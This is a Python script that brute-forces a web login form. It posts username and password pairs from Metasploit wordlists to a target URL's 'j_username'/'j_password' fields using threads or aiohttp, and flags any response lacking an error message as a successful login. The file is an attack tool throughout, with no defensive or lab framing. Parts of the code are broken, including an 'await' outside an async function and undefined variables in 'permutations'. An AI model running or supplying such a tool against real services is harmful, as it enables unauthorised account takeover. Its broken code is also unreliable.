#! /bin/python

from requests import Request, get, post, PreparedRequest
from requests.sessions import Session
import click
from pathlib import Path
import random
from threading import Thread, local
from queue import Queue
import sys
import timeit
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
from aiohttp.client import ClientSession

SESSION = Session()

@click.command()
@click.argument("url", type=str, required=True)
@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/password.lst")
@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/password.lst"))
@click.option("-t", "threads", type=int, default=8)
def crack(url:str, user_list:Path, password_list:Path, threads:int):
    request_count = 0
    requests = prepared_requests(url, user_list, password_list, "POST")
    with Session() as session:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(post_and_check, requests)

@click.command()
@click.argument("url", type=str, required=True)
@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/password.lst")
@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/password.lst"))
@click.option("-t", "threads", type=int, default=8)
def crack_asyncio(url:str, user_list:Path, password_list:Path, threads:int):
    myconn = aiohttp.TCPConnector()
    async with ClientSession(connector=myconn) as session:
        tasks = []
        for user, password in permutations(user_list, password_list):
            task = asyncio.ensure_future(async_post_and_check(url, user, password, session))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)



def prepared_requests(url, user_list, password_list, method:str):
    users = user_list.read_text("latin-1").splitlines()
    users = list(filter(lambda user: not any(char in user for char in ["!","§","$","%","&","/","(",")","=","?",")"] + [str(num) for num in range(10)]), users))
    users = users[0:10]
    passwords = password_list.read_text("latin-1").splitlines()[0:100]
    prepared_requests = []
    for user in users:
        for password in passwords:
            prepared_requests.append((user, password, Request(method=method, url=url, data={"j_username":user,"j_password": password, "Submit":"Sign+in"}).prepare()))
    return prepared_requests

def permutations(user_list, password_list):
    users = user_list.read_text("latin-1").splitlines()
    users = list(filter(lambda user: not any(char in user for char in ["!","§","$","%","&","/","(",")","=","?",")"] + [str(num) for num in range(10)]), users))
    users = users[0:10]
    passwords = password_list.read_text("latin-1").splitlines()[0:100]
    prepared_requests = []
    for user in users:
        for password in passwords:
            prepared_requests.append((user, password, Request(method=method, url=url, data={"j_username":user,"j_password": password, "Submit":"Sign+in"}).prepare()))
    return prepared_requests
           

def post_and_check(post_and_check_tuple):
    user, password, prepared_request = post_and_check_tuple
    response = SESSION.send(prepared_request)
    if "Invalid username or password" in response.text:
        print(f"Unsuccessful login for {user} : {password}")
    else:
        print(f"Successful login for {user} : {password}")
        sys.exit(0)

async def async_post_and_check(url, data, session:ClientSession):
    async with session.post(url, data) as response:
        result = await response.text()
        if "Invalid username or password" in result:
            print(f"Unsuccessful login for {data}")
        else:
            print(f"Successful login for {data}")
            sys.exit(0)


if __name__ == "__main__":
    start = timeit.default_timer()
    crack()
    end = timeit.default_timer()
    print(f"{end-start} seconds")